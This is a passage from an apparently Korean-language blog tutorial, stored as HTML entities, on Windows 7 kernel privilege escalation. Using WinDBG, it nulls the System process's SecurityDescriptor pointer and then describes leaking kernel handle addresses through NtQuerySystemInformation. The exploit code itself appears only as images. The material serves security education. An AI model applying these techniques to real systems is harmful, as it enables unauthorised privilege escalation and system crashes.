&#xC8FC;&#xC18C;&#xB098; &#xC81C;&#xACF5;&#xD558;&#xBA74; NULL&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB97C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC815;&#xC758;&#xB41C; &#xC8FC;&#xC18C;/&#xD3EC;&#xC778;&#xD130;&#xC5D0; &#x201C;NULL&#x201D;&#xC744; &#xB36E;&#xC5B4; &#xC4F8; &#xC218; &#xC788;&#xB294;&#xB370;, LPE&#xB97C; &#xB2EC;&#xC131;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC120; &#xC5B4;&#xB5BB;&#xAC8C; &#xD574;&#xC57C; &#xD560;&#xAE4C;&#xC694;? DACL&#xACFC; Security Description&#xB97C; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;.</p><h1 id="DACL-amp-Security-Description"><a href="#DACL-amp-Security-Description" class="headerlink" title="DACL &amp; Security Description"></a>DACL &amp; Security Description</h1><p>&#xC6B0;&#xC120;, &#x201C;DACL&#x201D;&#xACFC; &#x201C;Security Description&#x201D;&#xC774; &#xBB34;&#xC5C7;&#xC774;&#xACE0; &#x201C;Arbitrary Write NULL&#x201D;&#xC744; exploit &#xD558;&#xB294;&#xB370; &#xC5B4;&#xB5BB;&#xAC8C; &#xC4F0;&#xC77C; &#xC218; &#xC788;&#xC744;&#xAE4C;&#xC694;?</p><p><a href="https://networkencyclopedia.com/discretionary-access-control-list-dacl/">https://networkencyclopedia.com/discretionary-access-control-list-dacl/</a> &#xC5D0; &#xC758;&#xD558;&#xBA74;</p><blockquote><p>What is DACL (Discretionary Access Control List)? A DACL stands for Discretionary Access Control List, in Microsoft Windows family, is an internal list attached to an object in Active Directory that specifies which users and groups can access the object and what kinds of operations they can perform on the object. In Windows 2000 and Windows NT, an internal list attached to a file or folder on a volume formatted using the NTFS that has a similar function. How DACL works? In Windows, each object in Active Directory or a local NTFS volume has an attribute called Security Descriptor that stores information about The object&#x2019;s owner (the security identifier or the owner) and the groups to which the owner belongs. The discretionary access control list (DACL) of the object, which lists the security principals (users, groups, and computers) that have access to the object and their level of access. The system access control list (SACL), which lists the security principals that should trigger audit events when accessing the list</p></blockquote><p>&#xAC04;&#xB2E8;&#xD558;&#xAC8C;, &#x201C;DACL&#x201D;&#xC740; &#xC5EC;&#xB7EC; &#xAE30;&#xB2A5;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xACE0; &#xC788;&#xB294;&#xB370;, &#xADF8;&#xC911; &#xD558;&#xB098;&#xAC00; &#x201C;Security Description&#x201D; (&#xC870;&#xAE08; &#xC774;&#xB530;&#xAC00; &#xAE4A;&#xAC8C; &#xB2E4;&#xB8F0;)&#xC785;&#xB2C8;&#xB2E4;. &#xD638;&#xCD9C;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xACE0; &#xD2B9;&#xC815; &#xC0AC;&#xC6A9;&#xC790;, &#xADF8;&#xB8F9; &#xB610;&#xB294; &#xCEF4;&#xD4E8;&#xD130;&#xC5D0; &#xB300;&#xD574; &#xD5C8;&#xC6A9;&#xB418;&#xB294; &#xAC1D;&#xCCB4;(&#xD30C;&#xC77C;, &#xD504;&#xB85C;&#xC138;&#xC2A4;, &#xC4F0;&#xB808;&#xB4DC; &#xB4F1;)&#xC744; &#xD544;&#xD130;&#xB9C1;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xB9AC;&#xC2A4;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xD574;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xB098;&#xC694;? &#x201C;Window UI&#x201D;&#xB97C; &#xC0B4;&#xD3B4;&#xBD05;&#xC2DC;&#xB2E4;. =)</p><p><img src="/2021/11/28/fabu1ous/write-null/10.png" alt></p><p>&#xC544;&#xB9C8; &#xC774; &#xC0AC;&#xC9C4;&#xC740; &#xC880; &#xC775;&#xC219;&#xD558;&#xC2E4; &#xAC81;&#xB2C8;&#xB2E4;. &#xC704; &#xCC3D;&#xC5D0;&#xC11C; &#xB2E4;&#xC591;&#xD55C; &#x201C;DACL &amp; Security Description&#x201D;&#xC744; &#xAD00;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7F0;&#xAC8C; &#xC65C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC84C;&#xB294;&#xC9C0;&#xB294; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xC9C0; &#xC54A;&#xACA0;&#xC8E0;? &#xC911;&#xC694;&#xD55C; &#xAC83;&#xC740;, &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC5B4;&#xB5A4; &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C8; &#xC218; &#xC788;&#xB294;&#xC9C0;&#xB97C; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xC815;&#xC758;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC5B4;&#xB5A4; &#xAC1D;&#xCCB4;&#xAC00; &#x201C;DACL&#x201D;&#xC758; &#xD544;&#xD130;&#xB9C1;&#xC744; &#xBC1B;&#xC744;&#xAE4C;&#xC694;? &#x201C;Windows Internals&#x201D;&#xC640; &#x201C;structs&#x201D;&#xB97C; &#xC0B4;&#xD3B4;&#xBD05;&#xC2DC;&#xB2E4;.</p><p>&#xC6B0;&#xC120;, &#x201C;WinDBG&#x201D;&#xC5D0;&#xC11C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA9;&#xB85D;&#xC744; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/11.png" alt></p><p>&#x201C;WinDBG&#x201D;&#xC5D0;&#xC11C; windows &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA9;&#xB85D;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74;, &#xBAA8;&#xB4E0; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC8FC;&#xC18C;&#xAC12;&#xC744; &#xBE7C;&#xBA74;, &#xB3D9;&#xC77C;&#xD55C; &#xD328;&#xD134;&#xC740; &#xAC16;&#xB294;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704; &#xC0AC;&#xC9C4;&#xC5D0;&#xC11C; &#x201C;0x856117c8&#x201D; &#xC8FC;&#xC18C;&#xB294; windows &#xAC1D;&#xCCB4;&#xB97C; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;. &#xC774; &#xAC1D;&#xCCB4;&#xB294; &#xB2E4;&#xC74C; &#xACFC; &#xAC19;&#xC740; &#xAC83;&#xB4E4;&#xC744; &#xC815;&#xC758; &#xD569;&#xB2C8;&#xB2E4;. (&#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC774;&#xB984;, &#xAD8C;&#xD55C;, &#xD504;&#xB85C;&#xC138;&#xC2A4; ID, &#xD578;&#xB4E4; &#xB4F1;)</p><p>&#xC9C0;&#xAE08; &#xC800;&#xD76C;&#xAC00; &#xC720;&#xC2EC;&#xD788; &#xBD10;&#xC57C; &#xD560; &#xAC83;&#xC740; &#xC2E4;&#xC81C; &#xACF5;&#xACA9;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#x201C;nt!_OBJECT_HEADER struct&#x201D;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/12.png" alt></p><p>nt!_OBJECT_HEADER&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/13.png" alt></p><p>&#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; header&#xC5D0;&#xC11C; &#xC815;&#xBCF4;&#xB97C; &#xAD6C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xC0AC;&#xC9C4;&#xC5D0;&#xC11C; &#xBCFC; &#xC218; &#xC788;&#xB4DC;&#xC2DC; &#x201C;nt!_OBJECT_HEADER struct&#x201D;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xD574;&#xBD80;&#xD574; &#xBCFC;&#xC218; &#xC788;&#xACE0; &#xAC01; &#xAC1D;&#xCCB4;&#xAC00; &#xC5B4;&#xB514;&#xC5D0; &#xC704;&#xCE58;&#xD574; &#xC788;&#xB294;&#xC9C0; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC11C; &#xC911;&#xC694;&#xD55C; &#xC810;&#xC740; &#x201C;nt!_OBJECT_HEADER&#x201D;&#xB294; &#x201C;nt!_ERPOCESS&#x201D;&#xB85C;&#xBD80;&#xD130;&#xC758; offset&#xC744; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>Security Description&#xC5D0;&#xC120; &#xC5B4;&#xB5A4; &#xB3D9;&#xC791;&#xC774; &#xC774;&#xB904;&#xC9C8;&#xAE4C;&#xC694;?</p><p><img src="/2021/11/28/fabu1ous/write-null/14.png" alt></p><p>Security Description &#x201C;(0x85117b0 + 0x014)&#x201D;&#xC774; &#x201C;0x8c005e1f&#x201D;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC5D0; &#xC8FC;&#xBAA9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB294; &#x201C;DACL &amp; Security Description&#x201D;&#xACFC; &#xC5B4;&#xB5A0;&#xD55C; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294;&#xB370;, &#xC6B0;&#xC120; &#x201C;0x8c005e1f&#x201D; &#xC8FC;&#xC18C;&#xB97C; &#xC880; &#xB354; &#xAE4A;&#xAC8C; &#xC0B4;&#xD3B4;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/15.png" alt></p><p>WinDBG&#xB97C; &#xD1B5;&#xD574; SecurityDescription &#xC8FC;&#xC18C;&#xC5D0; &#x201C;!sd&#x201D; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xC2DC;&#xB2E4;. &#xAC04;&#xB2E8;&#xD55C; bit &#xACC4;&#xC0B0;&#xC73C;&#xB85C; Windows Internals&#xC758; &#xB3D9;&#xC791;&#xC744; &#xC774;&#xD574;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704; &#xC0AC;&#xC9C4;&#xC5D0;&#xC11C; &#xD45C;&#xC2DC;&#xB41C; &#xAC12;&#xB4E4;&#xC740; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC720;&#xC800; &#xC815;&#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xB798; DACL &#xC815;&#xBCF4;&#xC640; &#xBE44;&#xAD50;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/16.png" alt></p><p>&#xC704; &#xB450; &#xC0AC;&#xC9C4;&#xC744; &#xBE44;&#xAD50;&#xD574;&#xBCF4;&#xBA74;, &#x201C;SYSTEM&#x201D;&#xACFC; &#x201C;DAML&#x201D; &#xC720;&#xC800;&#xB4E4;&#xC740; SecurityDescription &#x201C;(Windows Internals)&#x201D;&#xC640; &#xAD00;&#xB828;&#xC774; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xC2DC;&#xB85C; (&#xC815;&#xD655;&#xD558;&#xC9C4; &#xC54A;&#xC9C0;&#xB9CC;) &#xC704; &#xB450; &#xAC12;&#xB4E4;&#xC744; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xBC95;&#xC744; &#xC54C;&#xC544; &#xBD05;&#xC2DC;&#xB2E4;.</p><p>&#xC77C;&#xBC18; &#xC720;&#xC800; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#x201C;ring0 (kernel)&#x201D; &#xC8FC;&#xC18C; &#xC5B4;&#xB514;&#xB4E0; NULL&#xB85C; &#xCD08;&#xAE30;&#xD654; &#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xAE30;&#xC5B5;&#xD55C;&#xCC44;&#xB85C; SecurityDescription &#xC8FC;&#xC18C; &#x201C;(0x865117b0+0x014)&#x201D;&#xB97C; &#x201C;NULL (0x00000000)&#x201D;&#xB85C; &#xB36E;&#xC5B4; &#xC4F0;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xB418;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/17.png" alt></p><p>SecurityDescription&#xC740; 0x8c005e1f&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/18.png" alt></p><p>SecurityDescription &#xD3EC;&#xC778;&#xD130;&#xB97C; NULL&#xB85C; &#xB36E;&#xC5B4;&#xC501;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/19.png" alt></p><p>&#xC790;! &#xC774;&#xC81C; &#x201C;System.exe (PID:4)&#x201D; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; NULL&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB41C; SecurityDescriptor &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xAC16;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC0C1;&#xD0DC;&#xB85C; &#x201C;VM snapshot&#x201D;&#xC744; &#xCC0D;&#xC5B4; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/20.png" alt></p><p>&#xD639;&#xC2DC;&#xB098; &#xC0AC;&#xC9C4;&#xC744; &#xC774;&#xD574;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xC2E4;&#xAE4C;&#xBD10; &#xC124;&#xBA85;&#xD558;&#xC790;&#xBA74; &#x201C;[system]&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC885;&#xB8CC;&#xD558;&#xC2DC;&#xACA0;&#xC2B5;&#xB2C8;&#xAE4C;?&#x201D;&#xB77C;&#xACE0; &#xC368;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/21.png" alt></p><p>DCOM server &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xB7F0;&#xCC98;&#xAC00; crash &#xB0A9;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xC7A0;&#xC2DC;&#xB9CC;, &#xBB34;&#xC2A8;&#xC77C;&#xC774; &#xC77C;&#xC5B4;&#xB09C;&#xAC70;&#xC8E0;? [System.exe] &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC218;&#xB3D9;&#xC73C;&#xB85C;, &#xC720;&#xC800; &#xAD8C;&#xD55C;&#xC73C;&#xB85C;, &#xC791;&#xC5C5;&#xAD00;&#xB9AC;&#xC790;&#xC5D0;&#xC11C; &#xC885;&#xB8CC;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xACE0;?</p></blockquote><p>&#xB124;! &#xC624;&#xC9C1; &#x201C;nt authority/SYSTEM&#x201D;&#xB9CC;&#xC774; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC885;&#xB8CC;&#xD560; &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC5B4;&#xB5BB;&#xAC8C; &#xC77C;&#xBC18; &#xC720;&#xC800;&#xAC00; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#x201C;BSOD&#x201D;&#xB97C; &#xBC1C;&#xC0DD; &#xC2DC;&#xCF30;&#xC744;&#xAE4C;&#xC694;? &#xC774; &#xBC29;&#xBC95;&#xC740; SYSTEM &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; SecurityDescription &#xB3D9;&#xC791;&#xC744; NULL&#xB85C; &#xBC14;&#xAFD4;&#xBC84;&#xB9AC;&#xB294; &#xC544;&#xC8FC; &#xC720;&#xBA85;&#xD55C;(well-known) exploit &#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;. &#xD0C0;&#xAC9F; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xAD8C;&#xD55C; bit&#xC744; &#xC5C6;&#xC5D0; &#xBC84;&#xB9B4; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; &#xAE30;&#xBC95;&#xC740; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; exploit&#xC5D0; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xC694;&#xC57D;&#xD558;&#xC790;&#xBA74;, &#xC800;&#xD76C;&#xB294; WinDBG&#xB97C; &#xD1B5;&#xD574; SecurityDescription&#xC5D0; &#xB2F4;&#xAE34; &#xAD8C;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xBAA8;&#xB450; &#xC9C0;&#xC6CC; &#x201C;&#xB204;&#xAD6C;&#xB098;&#x201D; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC4F0;&#xACE0;, &#xC77D;&#xACE0;, &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC544;&#xC9C1; &#xBB38;&#xC81C;&#xAC00; &#xB0A8;&#xC544; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Exploit&#xC744; &#xC131;&#xACF5;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xBC29;&#xBC95;&#xC740; &#xC54C;&#xACA0;&#xB294;&#xB370;, &#x201C;ring3 (user-land)&#x201D;&#xC5D0;&#xC11C; &#x201C;SYSTEM&#x201D; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAC1D;&#xCCB4;&#xB97C; &#xC5B4;&#xB5BB;&#xAC8C; &#xC2DD;&#xBCC4;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;&#xC694;?</p><p><img src="/2021/11/28/fabu1ous/write-null/22.png" alt></p><p>&#xC704; &#xC774;&#xBBF8;&#xC9C0;&#xB294; WinDBG&#xB97C; &#xD1B5;&#xD574; &#x201C;ring0 (kernel mode)&#x201D;&#xC5D0;&#xC11C; &#xB098;&#xC5F4;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA9;&#xB85D;&#xC785;&#xB2C8;&#xB2E4;. &#xAC1D;&#xCCB4;&#xAC00; &#xC5B4;&#xB514;&#xC5D0; &#xC788;&#xB294;&#xC9C0;, &#xADF8; &#xC8FC;&#xC18C;&#xB97C; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; &#x201C;ring3 (user-land)&#x201D;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xAC12;&#xB4E4;&#xC774; &#xC811;&#xADFC;&#xACFC; &#xC608;&#xCE21;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC78A;&#xC5B4;&#xBC84;&#xB9AC;&#xBA74; &#xC548;&#xB429;&#xB2C8;&#xB2E4;. &#x201C;Windows 7&#x201D;&#xBD80;&#xD130;&#xB294; &#x201C;(Address Space Layout Randomization: ASLR)&#x201D;&#xB77C;&#xB294; &#xC8FC;&#xC18C; &#xB79C;&#xB364;&#xD654;&#xAC00; &#xAD6C;&#xD604;&#xB418;&#xC5B4;&#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC815;&#xC801;&#xC778; &#xC8FC;&#xC18C;&#xB85C; &#xC2DC;&#xB3C4;&#xB418;&#xB294; &#xBAA8;&#xB4E0; &#xACF5;&#xACA9;&#xC740; &#xBD88;&#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xADF8;&#xB798;&#xC11C; &#xC774;&#xC820; &#xC5B4;&#xCA50;&#xB2E4;?</p></blockquote><h1 id="NtQuerySystemInformation-Handle-Leaking-Attack"><a href="#NtQuerySystemInformation-Handle-Leaking-Attack" class="headerlink" title="NtQuerySystemInformation - Handle Leaking Attack"></a>NtQuerySystemInformation - Handle Leaking Attack</h1><p>&#xC804;&#xC5D0;&#xB3C4; &#xB9D0;&#xD588;&#xB4DC;&#xC2DC;, &#xD604;&#xC7AC; &#xD0C0;&#xAC9F; OS (windows 7)&#xC73C;&#xB860; &#x201C;ring3 (user-land)&#x201D;&#xC5D0;&#xC11C; exploit&#xD558;&#xB294; &#xAC83;&#xC774; &#xBD88;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xBC29;&#xBC95;&#xC774; &#xC5C6;&#xC744;&#xAE4C;&#xC694;? &#xB2F5;&#xC740; &#xBC14;&#xB85C; &#x201C;NtQuerySystemInformation WinAPI call&#x201D;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#x201C;NtQuerySystemInformation&#x201D;&#xC740; &#xC124;&#xACC4;&#xC0C1; &#xB2E4;&#xC591;&#xD55C; &#xBCF4;&#xC548; &#xACB0;&#xD568;&#xC774; &#xC788;&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#x201C;&#xAE30;&#xB2A5;&#x201D;&#xC785;&#xB2C8;&#xB2E4;. &#x201C;WinAPI call&#x201D;&#xC758; &#xAC00;&#xC7A5; &#xD070; &#xBB38;&#xC81C;&#xC810;&#xC740; user call(undocumented behavior)&#xC744; &#xC218;&#xB77D;&#xD558;&#xB3C4;&#xB85D; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC989;,  ring0 &#xC815;&#xBCF4;&#xC640; &#xD568;&#xAED8; &#xD30C;&#xC2F1;&#xB418;&#xC11C; SYSTEM &#xC8FC;&#xC18C;/&#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB178;&#xCD9C;&#xD558;&#xB294; &#xC77C;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xAE30;&#xB3C4; &#xD55C;&#xB2E4;&#xB294; &#xB73B;&#xC785;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC5B4;&#xB5A4; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xC911;&#xC694;&#xD558;&#xACE0; &#xD0C0;&#xAC9F; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xC798; &#xC54C; &#xACE0; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB7F0; &#x201C;WinAPI Call&#x201D;&#xC740; &#xBA54;&#xBAA8;&#xB9AC; &#xB178;&#xCD9C; &#xACF5;&#xACA9;&#xC5D0; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC720;&#xBA85;&#xD55C;(well-known) &#xBC29;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xD558;&#xC9C0;&#xB9CC; ring3&#xC5D0;&#xC11C; &#xC5B4;&#xB5BB;&#xAC8C; &#xC815;&#xBCF4;&#xB97C; &#xB178;&#xCD9C; &#xC2DC;&#xD0A4;&#xC8E0;?</p></blockquote><p>&#xCDE8;&#xC57D;&#xD55C; &#xAE30;&#xB2A5; &#xD638;&#xCD9C;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xAE30; &#xC804;&#xC5D0; &#xC6B0;&#xC120; &#x201C;handle&#x201D;&#xC758; &#xC815;&#xC758;&#xB97C; &#xC54C;&#xC544;&#xBCF4;&#xACE0; &#xC65C; &#xC8FC;&#xBAA9;&#xD574;&#xC57C;&#xD558;&#xB294;&#xC9C0; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://stackoverflow.com/questions/902967/what-is-a-windows-handle">https://stackoverflow.com/questions/902967/what-is-a-windows-handle</a> &#xC5D0; &#xC758;&#xD558;&#xBA74;</p><blockquote><p>It&#x2019;s an abstract reference value to a resource, often memory or an open file, or a pipe.</p><p><em>Properly, in Windows, (and generally in computing) a handle is an abstraction which hides a real memory address from the API user, allowing the system to reorganize physical memory transparently to the program. Resolving a handle into a pointer locks the memory, and releasing the handle invalidates the pointer. In this case think of it as an index into a table of pointers&#x2026; you use the index for the system API calls, and the system can change the pointer in the table at will.</em></p><p><em>Alternatively a real pointer may be given as the handle when the API writer intends that the user of the API be insulated from the specifics of what the address returned points to; in this case it must be considered that what the handle points to may change at any time (from API version to version or even from call to call of the API that returns the handle) &#x2014; the handle should therefore be treated as simply an opaque value meaningful only to the API.</em></p></blockquote><p>&#xC694;&#xC57D;&#xD558;&#xC790;&#xBA74;, &#x201C;handle&#x201D;&#xC740; &#xC6B4;&#xC601;&#xCCB4;&#xC81C; &#xAC1D;&#xCCB4;(&#xD30C;&#xC77C;, api, pipe &#xB4F1;) &#xC0AC;&#xC774;&#xC758; &#xD1B5;&#xC2E0;&#xC744; &#xB9CC;&#xB4E4;&#xACE0; &#xC124;&#xC815;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC18D;&#xC131;&#xB4E4;&#xC744; &#xB2F4;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; handle&#xB4E4;&#xC740; &#xAC1D;&#xCCB4;&#xB4E4;&#xC5D0; &#xB300;&#xD55C; &#xB2E4;&#xC591;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xB294;&#xB370; &#xADF8;&#xC911; &#xD558;&#xB098;&#xAC00; &#xBC14;&#xB85C; &#xD3EC;&#xC778;&#xD130;&#xC785;&#xB2C8;&#xB2E4;. &#xC815;&#xB9D0; &#xC7AC;&#xBBF8;&#xC788;&#xB294; &#xC810;&#xC740;, &#x201C;handle&#x201D;&#xC740; &#xD3EC;&#xC778;&#xD130;&#xB97C; load&#xD558;&#xACE0; &#x201C;ring3 (user-land)&#x201D;&#xC5D0;&#xC11C; &#xB178;&#xCD9C;&#xC2DC;&#xD0AC; &#xBC29;&#xBC95;&#xC774; &#xC788;&#xB2E4;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;.</p><p>&#x201C;NtQuerySystemInformation&#x201D;&#xC740; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; call&#xB4E4;&#xC744; &#xC9C0;&#xC6B0;&#xB108;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xC911; &#x201C;SystemExtendedHandleInformation&#x201D;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; struct&#xB97C; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/23.png" alt></p><p>SYSTEM_HANDLE_TABLE_ENTRY_INFO</p><p><img src="/2021/11/28/fabu1ous/write-null/24.png" alt></p><p>SYSTEM_HANDLE_INFORMATION</p><p>&#xD574;&#xB2F9; struct&#xB294; &#x201C;handle &#xD3EC;&#xC778;&#xD130;&#x201D;&#xB97C; &#xB178;&#xCD9C;&#xC2DC;&#xD0A4;&#xB294;&#xB370; &#xB3C4;&#xC6C0;&#xC744; &#xC904; &#xAC81;&#xB2C8;&#xB2E4;.</p><p>&#xC124;&#xACC4;&#xC0C1;&#xC758; &#xACB0;&#xD568;&#xC744; &#xC774;&#xC6A9;&#xD574; &#x201C;ring3 (user-mode)&#x201D;&#xC5D0;&#xC11C; handle data&#xB97C; &#xD37C;&#xC9D5;&#xD574;&#xBCF4;&#xACE0; &#xBB34;&#xC2A8; &#xC77C;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/25.png" alt></p><p>handle data&#xB97C; &#xB178;&#xCD9C; &#xC2DC;&#xD0A4;&#xB294; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/11/28/fabu1ous/write-null/26.png" alt></p><p>&#xC774; &#xBD80;&#xBD84;&#xC740; &#xBAA8;&#xB4E0; handle&#xC744; 